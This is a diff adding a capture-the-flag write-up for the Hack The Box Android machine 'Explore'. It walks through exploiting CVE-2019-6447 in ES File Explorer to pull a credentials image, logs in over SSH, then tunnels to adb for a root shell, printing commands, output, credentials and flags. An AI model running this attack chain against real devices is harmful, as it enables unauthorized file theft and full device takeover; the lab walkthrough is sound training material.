@@ -4,7 +4,17 @@ Android, 20 Base Points, Easy
 ## Machine
 
 ![‏‏Explore.JPG](images/Explore.JPG)
- 
+
+### TL;DR;
+
+To solve this machine, we begin by enumerating open services – finding the ports ```2222```,```5555```,```33897```,```42135``` and ```59777```.
+
+***User:*** Found related ports of [ES File Explorer](https://es-file-explorer.en.uptodown.com/android) application with [CVE-2019-6447](https://nvd.nist.gov/vuln/detail/CVE-2019-6447) which allow us to read files from the device, Using that we found an image with SSH credentials.
+
+***Root:*** Found port ```5555``` which is ```adb```, Create SSH tunnel and run ```adb root``` and then ```adb shell``` to get a shell as a root user.
+
+![pwn.JPG](images/pwn.JPG)
+
 ## Explore Solution
 
 ### User
@@ -72,10 +82,127 @@ Service Info: Device: phone
 
 ```
 
-## Explore is still active machine - [Full writeup](Explore-Writeup.pdf) avaliable with root hash password only.
+We can see the ports ```42135```, ```59777``` which related to [ES File Explorer](https://es-file-explorer.en.uptodown.com/android), ES File Explorer application is a type of File Explorer to Android.
 
-Telegram: [@evyatar9](https://t.me/evyatar9)
+Found [CVE-2019-6447](https://nvd.nist.gov/vuln/detail/CVE-2019-6447) to the application and found also the following [POC](https://www.exploit-db.com/exploits/50070).
 
-Discord: [evyatar9](https://discordapp.com/users/812805349815091251)
+By using the function ```listPics``` from a device we can see the following result:
+```console
+┌─[evyatar@parrot]─[/hackthebox/Explore]
+└──╼ $ python3 exp.py listPics 10.10.10.247
 
-![pwn.JPG](images/pwn.JPG)
+==================================================================
+|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
+|                Coded By : Nehal a.k.a PwnerSec                 |
+==================================================================
+
+name : concept.jpg
+time : 4/21/21 02:38:08 AM
+location : /storage/emulated/0/DCIM/concept.jpg
+size : 135.33 KB (138,573 Bytes)
+
+name : anc.png
+time : 4/21/21 02:37:50 AM
+location : /storage/emulated/0/DCIM/anc.png
+size : 6.24 KB (6,392 Bytes)
+
+name : creds.jpg
+time : 4/21/21 02:38:18 AM
+location : /storage/emulated/0/DCIM/creds.jpg
+size : 1.14 MB (1,200,401 Bytes)
+
+name : 224_anc.png
+time : 4/21/21 02:37:21 AM
+location : /storage/emulated/0/DCIM/224_anc.png
+size : 124.88 KB (127,876 Bytes)
+
+``` 
+
+Let's try to get the ```/storage/emulated/0/DCIM/creds.jpg``` file:
+```console
+┌─[evyatar@parrot]─[/hackthebox/Explore]
+└──╼ $ python3 exp.py getFile 10.10.10.247 storage/emulated/0/DCIM/creds.jpg
+
+==================================================================
+|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
+|                Coded By : Nehal a.k.a PwnerSec                 |
+==================================================================
+
+[+] Downloading file...
+m[+] Done. Saved as `out.dat`.
+
+┌─[evyatar@parrot]─[/hackthebox/Explore]
+└──╼ $ mv out.dat creds.jpg
+```
+
+We can see the following creds ```kristi:Kr1sT!5h@Rp3xPl0r3!```:
+
+![creds.jpg](images/creds.jpg)
+
+We can see also port ````2222```` which is [SSH Server Banana Studio](https://play.google.com/store/apps/details?id=net.xnano.android.sshserver.tv&hl=en_US&gl=US)
+
+Let's connect ssh with the credentials above:
+```console
+┌─[evyatar@parrot]─[/hackthebox/Explore]
+└──╼ $ ssh kristi@10.10.10.247 -p 2222
+The authenticity of host '[10.10.10.247]:2222 ([10.10.10.247]:2222)' can't be established.
+RSA key fingerprint is SHA256:3mNL574rJyHCOGm1e7Upx4NHXMg/YnJJzq+jXhdQQxI.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.10.247]:2222' (RSA) to the list of known hosts.
+Password authentication
+Password: 
+:/sdcard $ cd /sdcard/                                                         
+:/sdcard $ ls
+Alarms  DCIM     Movies Notifications Podcasts  backups   user.txt 
+Android Download Music  Pictures      Ringtones dianxinos 
+:/sdcard $ cat user.txt
+f32017174c7c7e8f50c6da52891ae250
+
+```
+
+And we get the user flag ```f32017174c7c7e8f50c6da52891ae250```.
+
+### Root
+
+We can see on ```nmap``` scanning the port ```5555```, this port used by [adb](https://developer.android.com/studio/command-line/adb).
+
+So let's try to connect using adb (we can install it using [https://www.xda-developers.com/install-adb-windows-macos-linux/](https://www.xda-developers.com/install-adb-windows-macos-linux/)):
+```console
+┌─[evyatar@parrot]─[/hackthebox/Explore/platform-tools]
+└──╼ $ /adb connect 10.10.10.247:5555
+failed to connect to '10.10.10.247:5555': Connection timed out
+```
+
+By running the command above we get a timeout.
+
+But if we are create ssh tunnel as follow:
+```console
+┌─[evyatar@parrot]─[/hackthebox/Explore]
+└──╼ $ ssh -N  -L 1111:127.0.0.1:5555 kristi@10.10.10.247 -p 2222
+Password authentication
+Password: 
+```
+
+Now we can use the connect command again:
+```console
+┌─[evyatar@parrot]─[/hackthebox/Explore/platform-tools]
+└──╼ $ ./adb connect 127.0.0.1:1111
+connected to 127.0.0.1:1111
+```
+
+Now we can run ```adb root``` and ```adb shell``` to connect as root:
+```console
+┌─[evyatar@parrot]─[/hackthebox/Explore/platform-tools]
+└──╼ $ ./adb root
+restarting adbd as root
+┌─[evyatar@parrot]─[/hackthebox/Explore/platform-tools]
+└──╼ $./adb shell
+x86_64:/ # whoami
+root
+x86_64:/ # cat /data/root.txt
+f04fc82b6d49b41c9b08982be59338c5
+x86_64:/ # 
+
+```
+
+And we get the root flag ```f04fc82b6d49b41c9b08982be59338c5```.
